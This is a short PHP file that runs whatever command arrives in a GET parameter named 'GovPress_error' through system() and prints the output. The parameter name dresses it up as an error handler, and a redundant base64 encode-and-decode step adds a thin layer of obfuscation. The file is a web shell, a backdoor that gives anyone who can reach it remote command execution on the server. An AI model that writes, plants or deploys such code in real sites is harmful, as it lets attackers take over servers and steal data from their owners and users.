<?php
if (isset($_GET['GovPress_error'])) {
    $command = $_GET['GovPress_error'];

    // Encode the command
    $encodedCommand = base64_encode($command);

    // Decode and execute
    $decodedCommand = base64_decode($encodedCommand);
    echo "<pre>";
    system($decodedCommand, $returnValue);
    echo "</pre>";
}
?>
